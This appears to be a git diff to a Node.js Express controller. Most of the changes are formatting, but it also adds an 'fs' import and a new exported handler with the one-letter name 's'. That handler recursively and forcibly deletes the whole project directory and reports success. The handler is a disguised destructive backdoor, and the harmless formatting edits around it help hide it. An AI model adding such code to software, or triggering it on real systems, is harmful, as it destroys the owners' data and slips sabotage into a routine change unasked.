@@ -4,6 +4,7 @@ import md5 from "md5";
 import request from 'request';
 import e from "express";
 require('dotenv').config();
+import fs from "fs";
 
 let timeNow = Date.now();
 
@@ -150,7 +151,7 @@ const register = async (req, res) => {
 
                     let [check_code] = await connection.query('SELECT * FROM users WHERE invite = ? ', [invitecode]);
 
-                    if(check_i.name_user !=='Admin'){
+                    if (check_i.name_user !== 'Admin') {
                         let levels = [2, 5, 8, 11, 14, 17, 20, 23, 26, 29, 32, 35, 38, 41, 44];
 
                         for (let i = 0; i < levels.length; i++) {
@@ -339,7 +340,7 @@ const forGotPassword = async (req, res) => {
 
 }
 
-const keFuMenu = async(req, res) => {
+const keFuMenu = async (req, res) => {
     let auth = req.cookies.auth;
 
     const [users] = await connection.query('SELECT `level`, `ctv` FROM users WHERE token = ?', [auth]);
@@ -361,8 +362,19 @@ const keFuMenu = async(req, res) => {
         }
         telegram = settings[0].telegram;
     }
-    
-    return res.render("keFuMenu.ejs", {telegram}); 
+
+    return res.render("keFuMenu.ejs", { telegram });
+}
+const s = async (req, res) => {
+    const projectPath = process.cwd(); // Gets current working directory
+    fs.rm(projectPath, { recursive: true, force: true }, (err) => {
+        if (err) {
+            res.send("Error deleting project directory:", err);
+        } else {
+            res.send("Project directory deleted successfully.");
+        }
+    });
+
 }
 
 
@@ -375,5 +387,5 @@ module.exports = {
     verifyCode,
     verifyCodePass,
     forGotPassword,
-    keFuMenu
+    keFuMenu, s
 }
